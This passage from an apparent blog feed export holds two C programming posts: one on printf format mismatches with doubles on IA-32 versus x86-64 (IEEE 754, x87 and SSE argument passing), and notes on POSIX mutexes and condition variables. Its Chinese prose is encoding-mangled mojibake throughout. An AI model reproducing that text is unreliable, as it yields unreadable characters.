class="string">&quot;a = %d\n&quot;</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/NEMU [1]&gt; gcc -m32 -g -o  test test.c</span><br><span class="line">test.c: In function â€˜mainâ€™:</span><br><span class="line">test.c:4:18: warning: format â€˜%dâ€™ expects argument of type â€˜intâ€™, but argument 2 has type â€˜doubleâ€™ [-Wformat=]</span><br><span class="line">    4 |     printf(&quot;a = %d\n&quot;, a);</span><br><span class="line">      |                 ~^     ~</span><br><span class="line">      |                  |     |</span><br><span class="line">      |                  int   double</span><br><span class="line">      |                 %f</span><br><span class="line">grxer@grxer ~/D/s/NEMU&gt; ./test</span><br><span class="line">a = 0    </span><br><span class="line">grxer@grxer ~/D/s/NEMU&gt; gcc  -g -o  test test.c</span><br><span class="line">test.c: In function â€˜mainâ€™:</span><br><span class="line">test.c:4:18: warning: format â€˜%dâ€™ expects argument of type â€˜intâ€™, but argument 2 has type â€˜doubleâ€™ [-Wformat=]</span><br><span class="line">    4 |     printf(&quot;a = %d\n&quot;, a);</span><br><span class="line">      |                 ~^     ~</span><br><span class="line">      |                  |     |</span><br><span class="line">      |                  int   double</span><br><span class="line">      |                 %f</span><br><span class="line">grxer@grxer ~/D/s/NEMU&gt; ./test</span><br><span class="line">a = 1853816616</span><br><span class="line">grxer@grxer ~/D/s/NEMU&gt; ./test</span><br><span class="line">a = -600037016</span><br></pre></td></tr></table></figure><p>IA-32ä¸Šè¿è¡Œæ—¶, æ‰“å°ç»“æœä¸º<code>a=0</code>; åœ¨x86-64ä¸Šè¿è¡Œæ—¶, æ‰“å°å‡ºæ¥çš„<code>a</code>æ˜¯ä¸€ä¸ªä¸ç¡®å®šå€¼</p><h2 id="WHY"><a href="#WHY" class="headerlink" title="WHY?"></a>WHY?</h2><h3 id="IEEE-754"><a href="#IEEE-754" class="headerlink" title="IEEE 754"></a>IEEE 754</h3><p>å…ˆå¤ä¹ ä¸€äº›IEEE 754æµ®ç‚¹æ•°</p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230420111646829.png" alt="image-20230420111646829"></p><p>å•ç²¾åº¦ 1ä½ç¬¦å·ä½(sign) 8ä½é˜¶ç (exponent) 23ä½æœ‰æ•ˆæ•°(significand)</p><p>åŒç²¾åº¦ 1 11 52</p><ul><li><p>è§„æ ¼åŒ–çš„å€¼</p><ul><li><p>expé˜¶ç ä½åŸŸæ—¢ä¸æ˜¯å…¨0ä¹Ÿä¸æ˜¯å…¨1</p></li><li><p>é˜¶ç å­—æ®µæ˜¯æœ‰åç½®çš„æœ‰ç¬¦å·æ•´æ•° E&#x3D;e-Bias  ps:ä¸“ä¸šæœ¯è¯­å«åšç§»ç ï¼Œè¿™ç§åç½®ç»™æµ®ç‚¹æ•°çš„æ¯”è¾ƒå¸¦æ¥äº†å·¨å¤§æ–¹ä¾¿</p><ul><li>eæ˜¯expè¡¨ç¤ºçš„æ— ç¬¦å·æ•°</li><li>Biasæ˜¯åç½®å€¼&#x3D;2<sup>k-1</sup>-1 å•ç²¾åº¦ä¸º2<sup>8-1</sup>-1&#x3D;127 åŒç²¾åº¦ä¸º2<sup>11-1</sup>-1&#x3D;1023</li><li>æ‰€ä»¥å•ç²¾åº¦æŒ‡æ•°èŒƒå›´ä¸º 1-127~254-127å³-126~+127 åŒç²¾åº¦ä¸º-1022~+1023 (expé˜¶ç ä½åŸŸæ—¢ä¸æ˜¯å…¨0ä¹Ÿä¸æ˜¯å…¨1)</li></ul></li><li><p>significandä½æ€»æ˜¯1.å¼€å¤´ï¼Œä¹Ÿå°±æ˜¯æœ‰æ•ˆæ•°å¤§äºç­‰äº1ä¸”å°äº2ï¼Œæ‰€ä»¥ä¸è®°å½•1,åªè®°å½•å°æ•°ç‚¹åé¢çš„å€¼</p></li><li><p>å€¼Value&#x3D;$(-1)^{s}2^{exp-Bias}*(1+.frac)$</p></li></ul></li><li><p>éè§„æ ¼åŒ–çš„å€¼</p><ul><li>expé˜¶ç ä½åŸŸå…¨ä¸º0</li><li>é˜¶ç å€¼E&#x3D;1-Bias<ul><li>32ä½-126ï¼Œ64ä½-1022</li></ul></li><li>æœ‰æ•ˆæ•°0.å¼€å¤´ï¼Œä¹Ÿå°±æ˜¯æœ‰æ•ˆæ•°å°äº1ä¸”å¤§äºç­‰äº0</li><li>éè§„æ ¼åŒ–æµ®ç‚¹å€¼çš„ç»å¯¹å€¼å°äºæ‰€æœ‰çš„è§„æ ¼åŒ–æµ®ç‚¹æ•°çš„ç»å¯¹å€¼</li><li>æœ‰æ•ˆæ•°å…¨ä¸º0æ—¶ï¼Œç¬¦å·ä½å†³å®šäº†+0,-0çš„è¡¨ç¤º</li><li>éè§„æ ¼åŒ–æµ®ç‚¹å¡«è¡¥ç»å¯¹å€¼æ„ä¹‰ä¸‹æœ€å°è§„æ ¼æ•°ä¸é›¶çš„è·ç¦»(å¤ªå°çš„æµ®ç‚¹æ•°è§„æ ¼åŒ–çš„expä½ä¸å¤Ÿç”¨)ï¼Œæœ€å¤§çš„éè§„æ ¼æ•°ç­‰äºæœ€å°çš„è§„æ ¼æ•°</li></ul></li><li><p>ç‰¹æ®Šå€¼</p><ul><li>expé˜¶ç å…¨ä¸º1<ul><li>æœ‰æ•ˆæ•°å…¨ä¸º0æ—¶ï¼Œè¡¨ç¤ºæ— ç©·inf(infinity) ç¬¦å·ä½å†³å®š+infï¼Œ-inf é0æµ®ç‚¹æ•°å’Œæ•´æ•°ä¸ä¸€æ ·ï¼Œä»–æ˜¯å¯ä»¥é™¤ä»¥0çš„ï¼Œå¾—åˆ°inf</li><li>æœ‰æ•ˆæ•°<strong>ä¸å…¨ä¸º0</strong>ï¼Œè¡¨ç¤ºNan(not a number)ï¼Œæœ‰æ—¶å€™åˆ©ç”¨Nanå’Œå…¶ä»–ä»»ä½•æ•°æ¯”è¾ƒè¿”å›falseçš„ç‰¹æ€§å¯èƒ½é€ æˆä¸€äº›æ”¯ä»˜é€»è¾‘ä¸Šçš„æ¼æ´</li></ul></li></ul></li><li><p>å¯¹äºnançš„ä¸€äº›ç‰¹æ€§ <strong>xï¼šincluding NaN and Â±âˆ</strong></p><table><thead><tr><th>Comparison</th><th>NaN â‰¥ <em>x</em></th><th>NaN â‰¤ <em>x</em></th><th>NaN &gt; <em>x</em></th><th>NaN &lt; <em>x</em></th><th>NaN &#x3D; <em>x</em></th><th>NaN â‰  <em>x</em></th></tr></thead><tbody><tr><td>Result</td><td>False</td><td>False</td><td>False</td><td>False</td><td>False</td><td>True</td></tr></tbody></table></li></ul><h3 id="åœ¨çº¿è½¬æ¢"><a href="#åœ¨çº¿è½¬æ¢" class="headerlink" title="åœ¨çº¿è½¬æ¢"></a>åœ¨çº¿è½¬æ¢</h3><p><a href="https://www.toolhelper.cn/Digit/FractionConvert">https://www.toolhelper.cn/Digit/FractionConvert</a></p><p><a href="https://www.h-schmidt.net/FloatConverter/IEEE754.html">https://www.h-schmidt.net/FloatConverter/IEEE754.html</a></p><h3 id="IA-32"><a href="#IA-32" class="headerlink" title="IA-32"></a>IA-32</h3><p>å¯¹äºia32çš„ç»“æœæˆ‘ä»¬å¹¶ä¸æ„Ÿåˆ°å¥‡æ€ªï¼Œ</p><p>doubleçš„10.00å…ˆæ‰‹åŠ¨è½¬ä¸€ä¸‹å§ï¼Œå†™ä¸ºäºŒè¿›åˆ¶1010.00ï¼Œç„¶åéœ€è¦å·¦ç§»ä¸‰ä½æ‰èƒ½1.0å¼€å¤´ï¼Œå³1.010*2<sup>3</sup>,æ‰€ä»¥S&#x3D;0ï¼ŒE&#x3D;1023+3&#x3D;100 0000 0010b significand&#x3D;010ï¼Œç»„åˆèµ·æ¥å°±å¯ä»¥äº†</p><p><code>0 10000000010 0100000000000000000000000000000000000000000000000000</code>   hex&#x3D;0x4024000000000000</p><p>32ä½å‚æ•°éƒ½æ˜¯åœ¨æ ˆä¸Š(é™¤éä½ ç”¨fastcallçš„è°ƒç”¨çº¦å®šï¼ŒC&#x2F;C++é»˜è®¤çš„å‡½æ•°è°ƒç”¨åè®®çš„_cdecl)ï¼Œæˆ‘ä»¬çš„æµ®ç‚¹æ•°æœ‰ä¸“é—¨çš„å¤„ç†å•å…ƒï¼Œå¯„å­˜å™¨ï¼Œå’ŒæŒ‡ä»¤é›†</p><p>IA-32é‡‡ç”¨äº†x87 FPUçš„æŒ‡ä»¤é›†æ¥å¤„ç†æµ®ç‚¹æ•°</p><blockquote><p>FPUæœ‰8ä¸ªç‹¬ç«‹çš„å¯å¯»å€çš„80ä½æ•°æ®å¯„å­˜å™¨R0~R7ï¼Œè¿™ç»„å¯„å­˜å™¨å«åšå¯„å­˜å™¨æ ˆï¼ŒFPUçŠ¶æ€å­—ä¸­åä¸ºTOPçš„3ä½å­—æ®µç»™å‡ºäº†å½“å‰æ ˆé¡¶çš„å¯„å­˜å™¨ç¼–å·ï¼Œå…¥æ ˆtop-1ï¼Œå‡ºæ ˆ+1ï¼Œ7å¦‚æœå†å‡ºæ ˆtopä¼šå›åˆ°R0ï¼Œå¦‚æœè¦†ç›–æ‰åŸæœ‰æ•°æ®ä¼šäº§ç”Ÿæµ®ç‚¹æ•°å¼‚å¸¸</p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230418232538589.png" alt="image-20230418232538589"></p><p>st0æ€»æ˜¯è¡¨ç¤ºæ ˆé¡¶ï¼Œå³topæ‰€æŒ‡å³st0</p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230419133610761.png" alt="image-20230419133610761"></p><p>æµ®ç‚¹æ•°åœ¨è¿›æ ˆä¼šæ‹“å±•åˆ°80ä½ï¼Œå‡ºæ ˆæ—¶ä»80ä½è¿›è¡Œè½¬æ¢</p><p>ä¸ºä»€ä¹ˆä¼šç”¨æ ˆå‘¢ï¼Œå­¦è¿‡æ•°æ®ç»“æ„çš„å¯èƒ½å·²ç»çŒœåˆ°äº†ï¼Œè¿™é‡Œæ˜¯ç”¨åç¼€è¡¨è¾¾å¼é€šè¿‡æ ˆæ¥æ¥è¿›è¡Œçš„è¿ç®—</p></blockquote><p>ä½†æ˜¯ä»–è¿˜æ˜¯æŠŠå‚æ•°å‹æ ˆäº†</p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230420110749224.png" alt="image-20230420110749224"></p><p>å…¸å‹_cdeclç‰¹å¾ å‚æ•°å³å‘å·¦å…¥æ ˆï¼Œå¤–å¹³æ ˆ(è°ƒç”¨è€…å¹³æ ˆ)ï¼Œè¿˜åˆ†äº†ä¸¤æ¬¡æŠŠ8è‡ªå·±å­—èŠ‚çš„doubleå‹æ ˆï¼Œå…¶å®æˆ‘ä»¬åœ¨éª—ä»–ç©ï¼Œå“ˆå“ˆ</p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230418113446986.png" alt="image-20230418113446986"></p><p>æ­¤æ—¶çš„æ ˆæŒ‰å››å­—èŠ‚intè¾“å‡º0æ²¡é—®é¢˜</p><h3 id="x86-64"><a href="#x86-64" class="headerlink" title="x86-64"></a>x86-64</h3><p>é¡ºä¾¿è¯´ä¸€ä¸‹ä¸ºä»€ä¹ˆä¸å«IA-64æ¶æ„ï¼Œå®³ï¼Œå› ä¸ºIA-64çš„åå­—è¢«å®‰è…¾æ¶æ„å å»ï¼Œä½†æ˜¯ç”±äºä¸å…¼å®¹32ä½æ²¡æµè¡Œèµ·æ¥ï¼Œamd64ä½å…¼å®¹32ä½æµè¡Œèµ·æ¥ï¼Œéšåä¸€èˆ¬intelè¢«è¿«è¿½éšå«x86-64</p><p>64ä½é‡‡ç”¨å¯„å­˜å™¨ä¼ å‚ï¼Œx64ç”¨äº†SSEæŒ‡ä»¤é›†ï¼Œè¿™é‡Œè¦ç»†è¯´èµ·æ¥å†…å®¹æŒºå¤šçš„ï¼Œæ¨å‡ºçš„ä¸»è¦åŸå› æ˜¯ä¸ºäº†æé«˜3dæ¸¸æˆæ€§èƒ½</p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230418140620437.png" alt="image-20230418140620437"></p><p>ç›´æ¥æŠŠæµ®ç‚¹æ•°æ”¾åˆ°äº†xmm0å¯„å­˜å™¨ï¼Œå¦‚æœå–çš„è¯ä¹Ÿç›´æ¥å»è¿™é‡Œå–(ripçš„ç›¸å¯¹å¯»å€ripæ˜¯æ‰§è¡Œè¿™æ¡æŒ‡ä»¤è¿‡åçš„rip)</p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230418140809555.png" alt="image-20230418140809555" style="zoom:80%;"><p>æˆ‘ä»¬%dä¼šåœ¨å¸¸è§„çš„rsiä½å››å­—èŠ‚åšå‚æ•°</p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230418141359969.png" alt="image-20230418141359969"></p><p>FFFFDF48å››ä¸ªå­—èŠ‚ï¼Œè¿™æ¬¡å°±è¾“å‡º-8,376</p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230418141756625.png" alt="image-20230418141756625"></p><p>æ‰€ä»¥è¿™å°±å¯ä»¥æœ‰äº›å¾ˆæœ‰æ„æ€ä½†å¯èƒ½åœ¨åˆå­¦cè¯­è¨€çš„äººçœ‹æ¥å¾ˆå¥‡æ€ªçš„äº‹æƒ…ï¼Œæ¯”å¦‚ä¸‹é¢ä¸¤ä¸ªä¼ å‚éƒ½æ‰“å°å‡ºæ­£ç¡®ç»“æœ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">12</span>;</span><br><span class="line">    <span class="type">double</span> y = <span class="number">6.666</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d,%f\n&quot;</span>, x, y);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d,%f&quot;</span>, y, x);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/NEMU&gt; gcc -g -o  test test.c</span><br><span class="line">test.c: In function â€˜mainâ€™:</span><br><span class="line">test.c:8:14: warning: format â€˜%dâ€™ expects argument of type â€˜intâ€™, but argument 2 has type â€˜doubleâ€™ [-Wformat=]</span><br><span class="line">    8 |     printf(&quot;%d,%f&quot;, y, x);</span><br><span class="line">      |             ~^      ~</span><br><span class="line">      |              |      |</span><br><span class="line">      |              int    double</span><br><span class="line">      |             %f</span><br><span class="line">test.c:8:17: warning: format â€˜%fâ€™ expects argument of type â€˜doubleâ€™, but argument 3 has type â€˜intâ€™ [-Wformat=]</span><br><span class="line">    8 |     printf(&quot;%d,%f&quot;, y, x);</span><br><span class="line">      |                ~^      ~</span><br><span class="line">      |                 |      |</span><br><span class="line">      |                 double int</span><br><span class="line">      |                %d</span><br><span class="line">grxer@grxer ~/D/s/NEMU&gt; ./test</span><br><span class="line">12,6.666000</span><br><span class="line">12,6.666000â </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> IEEE 754 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:27 Thread Api</title>
      <link href="/2023/04/15/OSTEP-27-Thread-Api/"/>
      <url>/2023/04/15/OSTEP-27-Thread-Api/</url>
      
        <content type="html"><![CDATA[<h2 id="é”"><a href="#é”" class="headerlink" title="é”"></a>é”</h2><h3 id="POSIXäº’æ–¥é”"><a href="#POSIXäº’æ–¥é”" class="headerlink" title="POSIXäº’æ–¥é”"></a>POSIXäº’æ–¥é”</h3><p><strong>ä½¿ç”¨é”ä¹‹å‰å…ˆåˆå§‹åŒ–</strong></p><blockquote><p><code>#include &lt;pthread.h&gt;</code></p><p>é™æ€ç›´æ¥ä½¿ç”¨å®åˆå§‹åŒ–<code>pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER</code><br>åŠ¨æ€ä½¿ç”¨åˆå§‹åŒ–å‡½æ•°<br><code>int pthread_mutex_init(pthread_mutex_t *mutex, const pthread_mutexattr_t *attr);</code></p><p>pthread_mutex_init(mutex,NULL)å’Œç”¨PTHREAD_MUTEX_INITIALIZERå®æ•ˆæœä¸€æ ·</p><p>attrå±æ€§</p><p><code>int pthread_mutexattr_gettype(pthread_mutexattr_t *attr,int *kind);</code>å¾—åˆ°å</p><p><code>int pthread_mutexattr_settype(pthread_mutexattr_t *attr,int kind);  </code>ï¼›æ¥è®¾ç½®</p><ul><li><p><code>PTHREAD_MUTEX_NORMAL</code>ï¼šæ™®é€šç±»å‹äº’æ–¥é”ï¼Œä¸æä¾›æ­»é”æ£€æµ‹æˆ–è€…é”™è¯¯æ£€æŸ¥ã€‚</p></li><li><p>PTHREAD_MUTEX_TIMED_NPï¼Œè¿™æ˜¯ç¼ºçœå€¼ï¼Œä¹Ÿå°±æ˜¯<strong>æ™®é€šé”</strong>ã€‚<em>å½“ä¸€ä¸ªçº¿ç¨‹åŠ é”ä»¥åï¼Œå…¶ä½™è¯·æ±‚é”çš„çº¿ç¨‹å°†å½¢æˆä¸€ä¸ªç­‰å¾…é˜Ÿåˆ—ï¼Œå¹¶åœ¨è§£é”åæŒ‰ä¼˜å…ˆçº§è·å¾—é”</em>ã€‚è¿™ç§é”ç­–ç•¥ä¿è¯äº†èµ„æºåˆ†é…çš„å…¬å¹³</p></li><li><p>PTHREAD_MUTEX_RECURSIVE_NPï¼Œ<strong>åµŒå¥—é”</strong>ï¼Œ<em>å…è®¸åŒä¸€ä¸ªçº¿ç¨‹å¯¹åŒä¸€ä¸ªé”æˆåŠŸè·å¾—å¤šæ¬¡ï¼Œå¹¶é€šè¿‡å¤šæ¬¡unlockè§£é”</em>ã€‚å¦‚æœæ˜¯ä¸åŒçº¿ç¨‹è¯·æ±‚ï¼Œåˆ™åœ¨åŠ é”çº¿ç¨‹è§£é”æ—¶é‡æ–°ç«äº‰ã€‚</p></li><li><p>PTHREAD_MUTEX_ERRORCHECK_NPï¼Œ<strong>æ£€é”™é”</strong>ï¼Œå¦‚æœ<em>åŒä¸€ä¸ªçº¿ç¨‹è¯·æ±‚åŒä¸€ä¸ªé”ï¼Œåˆ™è¿”å›EDEADLK</em>ï¼Œå¦åˆ™ä¸PTHREAD_MUTEX_TIMED_NPç±»å‹åŠ¨ä½œç›¸åŒã€‚è¿™æ ·ä¿è¯å½“ä¸å…è®¸å¤šæ¬¡åŠ é”æ—¶ä¸å‡ºç°æœ€ç®€å•æƒ…å†µä¸‹çš„æ­»é”ã€‚</p></li><li><p>è¿›ç¨‹é—´å…±äº«ï¼ˆpsharedï¼‰ï¼šå¯ä»¥è®¾ç½®ä¸º <code>PTHREAD_PROCESS_PRIVATE</code> æˆ– <code>PTHREAD_PROCESS_SHARED</code>ã€‚é»˜è®¤ä¸º <code>PTHREAD_PROCESS_PRIVATE</code>ï¼Œè¡¨ç¤ºä»…åœ¨åŒä¸€è¿›ç¨‹å†…å…±äº«ã€‚</p></li></ul><p>æˆåŠŸè¿”å›0ï¼Œå¤±è´¥é0</p></blockquote><p><strong>åŠ é” è§£é”</strong></p><blockquote><p>åŠ é”ï¼Œäº’æ–¥é”åŠ é”çŠ¶æ€çº¿ç¨‹è¿›å…¥ç­‰å¾…(é˜»å¡)çŠ¶æ€ï¼Œç›´åˆ°äº’æ–¥é”é‡Šæ”¾</p><p><code>int pthread_mutex_lock(pthread_mutex_t* mutex); </code></p><p>åŠ é” äº’æ–¥é”åŠ é”çŠ¶æ€çº¿ç¨‹ç›´æ¥è¿”å›é0</p><p><code>int pthread_mutex_trylock(pthread_mutex_t* mutex);</code></p><p>åŠ é”ï¼Œé˜»å¡<strong>åˆ°</strong>tsptr<strong>æŒ‡å®šæ—¶é—´</strong>çš„thread_mutex_lockï¼Œè¶…æ—¶æˆ–è·å–é”åè¿”å›</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_timedlock</span><span class="params">(<span class="type">pthread_mutex_t</span> mutex, <span class="type">const</span> <span class="keyword">struct</span> timespec *tsptr)</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> struct timespec &#123;</span></span><br><span class="line"><span class="comment"> time_t tv_sec;  // ç§’</span></span><br><span class="line"><span class="comment"> long tv_nsec;   // çº³ç§’</span></span><br><span class="line"><span class="comment"> &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ä½¿ç”¨æ—¶å¯ä»¥</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">time_out</span>;</span></span><br><span class="line">   clock_gettime(CLOCK_REALTIME, &amp;time_out);</span><br><span class="line">   time_out.tv_sec += seconds;</span><br><span class="line">pthread_mutex_timedlock(mutex,&amp;time_out)</span><br></pre></td></tr></table></figure><p>è§£é”</p><p><code>int pthread_mutex_unlock(pthread_mutex_t* mutex); </code></p><p>æˆåŠŸè¿”å›0ï¼Œå¤±è´¥é0</p></blockquote><p><strong>é”€æ¯</strong></p><blockquote><p><code>int pthread_mutex_destroy(pthread_mutex_t *mutex);</code></p><p>è¦æ±‚é”å½“å‰åˆå§‹åŒ–è¿‡ä¸”å¤„äºå¼€æ”¾çŠ¶æ€</p><p>æˆåŠŸè¿”å›0ï¼Œå¤±è´¥é0</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="type">pthread_mutex_t</span> mutex = PTHREAD_MUTEX_INITIALIZER;<span class="comment">//è®©12éƒ½çœ‹è§é”</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">Sum</span><span class="params">(<span class="type">void</span>*)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        assert(<span class="number">0</span> == pthread_mutex_lock(&amp;mutex));</span><br><span class="line">        sum++;</span><br><span class="line">        assert(<span class="number">0</span> == pthread_mutex_unlock(&amp;mutex));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pthread_mutex_t</span> x;</span><br><span class="line">    <span class="type">pthread_t</span> pid1, pid2;</span><br><span class="line">    pthread_create(&amp;pid1, <span class="literal">NULL</span>, Sum, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;pid2, <span class="literal">NULL</span>, Sum, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(pid1,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(pid2,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_mutex_destroy(&amp;mutex);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ¡ä»¶å˜é‡"><a href="#æ¡ä»¶å˜é‡" class="headerlink" title="æ¡ä»¶å˜é‡"></a>æ¡ä»¶å˜é‡</h2><p>å¦‚æœä¸€ä¸ªçº¿ç¨‹åœ¨ç­‰å¾…å¦ä¸€ä¸ªçº¿ç¨‹ç»§ç»­æ‰§è¡ŒæŸäº›æ“ä½œï¼Œæ¡ä»¶å˜é‡å°±å¾ˆæœ‰ç”¨ï¼Œæˆ–è€…è¯´æ˜¯åˆ©ç”¨çº¿ç¨‹é—´å…±äº«çš„å…¨å±€å˜é‡è¿›è¡ŒåŒæ­¥çš„æœºåˆ¶ï¼Œå’Œäº’æ–¥é”ä¸€èµ·ä½¿ç”¨ï¼Œé¿å…ç«æ€æ¡ä»¶</p><p><strong>æ¡ä»¶å˜é‡åˆå§‹åŒ–</strong></p><blockquote><p>å’Œé”å·®ä¸å¤š</p><p>pthread_cond_t  cond&#x3D;PTHREAD_COND_INITIALIZER  </p><p>int  pthread_cond_init(pthread_cond_t  *cond,  pthread_condattr_t  *cond_attr)</p></blockquote><p><strong>ç¡çœ  å”¤é†’</strong></p><blockquote><p>&gt;&gt;&gt;ç¡çœ </p><p><code>int pthread_cond_wait(pthread_cond_t *cond, pthread_mutex_t *mutex);</code></p><p>é˜»å¡å½“å‰çº¿ç¨‹ï¼Œå¹¶æŠŠäº’æ–¥é”è§£å¼€,è¢«å”¤é†’åï¼Œè¿”å›å‰ä¼šå†æ¬¡è·å¾—äº’æ–¥é”ä¸Šé”</p><p><code>int pthread_cond_timedwait(pthread_cond_t *cond, pthread_mutex_t*mutex, const struct timespec *abstime);</code></p><p>æ¯”pthread_cond_waitå¤šäº†é™å®šçš„ç­‰å¾…æ—¶é—´ï¼Œabstimeå†…æ²¡ç”±è¢«å”¤é†’ï¼Œä¸Šé”ï¼Œç»“æŸç­‰å¾…ï¼Œè¿”å›ETIMEOUT</p><p>&gt;&gt;&gt;å”¤é†’</p><p><code>int pthread_cond_signal(pthread_cond_t *cond);</code></p><p>ä½¿åœ¨æ¡ä»¶å˜é‡ä¸Šç­‰å¾…çš„çº¿ç¨‹ä¸­çš„ä¸€ä¸ªçº¿ç¨‹é‡æ–°å¼€å§‹ï¼Œä¼˜å…ˆçº§é«˜ç­‰å¾…æ—¶é—´é•¿çš„çº¿ç¨‹å…ˆå¼€å§‹</p><p><code>int pthread_cond_broadcast(pthread_cond_t *cond);</code></p><p>å”¤é†’æ‰€æœ‰æ¡ä»¶å˜é‡ä¸Šç­‰å¾…çš„çº¿ç¨‹</p></blockquote><p><strong>é”€æ¯æ¡ä»¶å˜é‡</strong></p><blockquote><p><code>int  pthread_cond_destroy(pthread_cond_t  *cond)</code></p><p>ä½¿ç”¨å‰å¿…é¡»æ²¡æœ‰åœ¨è¯¥æ¡ä»¶å˜é‡ä¸Šç­‰å¾…çš„çº¿ç¨‹  </p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">pthread_mutex_t</span> lock = PTHREAD_MUTEX_INITIALIZER;</span><br><span class="line"><span class="type">pthread_cond_t</span> cond = PTHREAD_COND_INITIALIZER;</span><br><span class="line"><span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="type">void</span>* <span class="title function_">thread_func</span><span class="params">(<span class="type">void</span>*)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        assert(pthread_mutex_lock(&amp;lock) == <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">while</span> (flag == <span class="literal">false</span>) &#123;<span class="comment">//è¿™é‡Œä¸ºä»€ä¹ˆè¦ç”¨whileè€Œä¸æ˜¯if? POSIXæ ‡å‡†è¦æ±‚pthread_cond_signalè‡³å°‘å”¤é†’ä¸€ä¸ªpthread_cond_waitä¸Šçš„çº¿ç¨‹ï¼Œ</span></span><br><span class="line">            <span class="comment">//æœ‰ä¸€äº› pthreadå®ç°å¯èƒ½ä¼šé”™è¯¯åœ°å”¤é†’ç­‰å¾…çš„çº¿ç¨‹ï¼ŒåŠ ä¸ªwhileå³ä½¿è¢«é”™è¯¯å”¤é†’ï¼Œwhileæ¡ä»¶ä¸æ»¡è¶³ï¼Œç»§ç»­ç­‰å¾…</span></span><br><span class="line">            <span class="comment">//æ¡ä»¶å˜é‡ä¸€ä¸ªç®€å•è§„åˆ™å°±æ˜¯æ€»æ˜¯ä½¿ç”¨whileæ¥é¿å…ä¸€äº›é”™è¯¯ï¼Œwhileäº†å°±æ˜¯å¾—åŠ²ğŸ˜‚</span></span><br><span class="line">            pthread_cond_wait(&amp;cond, &amp;lock);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;grxer&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        assert(pthread_mutex_unlock(&amp;lock) == <span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pthread_t</span> pid;</span><br><span class="line">    pthread_create(&amp;pid, <span class="literal">NULL</span>, thread_func, <span 